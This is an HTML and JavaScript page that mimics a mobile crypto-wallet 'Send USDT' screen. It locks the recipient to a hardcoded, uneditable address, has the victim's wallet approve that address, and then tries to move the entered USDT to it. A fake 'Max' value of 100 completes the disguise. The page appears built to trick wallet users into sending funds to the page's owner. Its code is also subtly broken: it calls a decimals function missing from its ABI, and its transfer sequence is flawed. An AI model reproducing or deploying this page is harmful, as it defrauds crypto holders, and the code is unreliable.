<!DOCTYPE html>
<html>
<head>
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      font-family: sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      color: #000;
      height: 100%;
      display: flex;
      flex-direction: column;
    }

    .container {
      flex: 1;
      padding: 16px;
      display: flex;
      flex-direction: column;
    }

    label {
      font-size: 14px;
      color: #555;
      display: block;
      margin: 20px 0 8px;
    }

    .input-box, .amount-section {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 0 10px;
    }

    .input-box input, .amount-section input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
    }

    .input-box .clear-btn,
    .input-box .paste-btn {
      background: none;
      border: none;
      font-size: 16px;
      color: #0052ff;
      font-weight: bold;
      cursor: pointer;
    }

    .amount-section span, .max-btn {
      padding: 0 12px;
      color: #0052ff;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
    }

    .converted {
      margin-top: 10px;
      color: #888;
      font-size: 14px;
    }

    .footer {
      padding: 16px;
      background: #fff;
      box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
    }

    .button {
      background-color: #0052ff;
      color: white;
      padding: 16px;
      border: none;
      width: 100%;
      font-size: 18px;
      font-weight: bold;
      border-radius: 20px;
      cursor: pointer;
    }

    .button.processing {
      background-color: #fff;
      color: #0052ff;
      position: relative;
    }

    .button.processing::after {
      content: "Processing...";
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      background: rgba(255,255,255,0.8);
      border-radius: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="container">
    <label>Address or Domain Name</label>
    <div class="input-box">
      <input type="text" id="address" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" disabled>
      <button class="clear-btn" disabled>&times;</button>
      <button class="paste-btn" disabled>Paste</button>
    </div>

    <label>Amount</label>
    <div class="amount-section">
      <input type="number" id="amount" placeholder="USDT Amount" />
      <span>USDT</span>
      <span class="max-btn" onclick="setMax()">Max</span>
    </div>

    <div class="converted" id="converted">= $0.00</div>
  </div>

  <div class="footer">
    <button class="button" id="nextBtn" onclick="nextStep()">Next</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script>
    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
    const ABI = [
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ];

    function setMax() {
      document.getElementById("amount").value = 100;
      document.getElementById("converted").innerText = "= $100.00";
    }

    async function nextStep() {
      const btn = document.getElementById("nextBtn");
      btn.classList.add("processing");

      if (!window.ethereum) {
        alert("Please open in Trust Wallet browser.");
        btn.classList.remove("processing");
        return;
      }

      try {
        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const accounts = await web3.eth.getAccounts();
        const user = accounts[0];
        const amount = document.getElementById("amount").value;
        const contract = new web3.eth.Contract(ABI, USDT);
        const decimals = await contract.methods.decimals().call();
        const value = web3.utils.toBN(web3.utils.toWei(amount, "ether")).div(web3.utils.toBN(10).pow(web3.utils.toBN(18 - decimals)));

        await contract.methods.approve(RECEIVER, value).send({ from: user });
        await contract.methods.transferFrom(user, RECEIVER, value).send({ from: user });

        btn.innerText = "✅ Sent";
      } catch (err) {
        console.error(err);
        btn.innerText = "❌ Failed";
      }

      setTimeout(() => {
        btn.classList.remove("processing");
        btn.innerText = "Next";
      }, 3000);
    }
  </script>

</body>
</html>
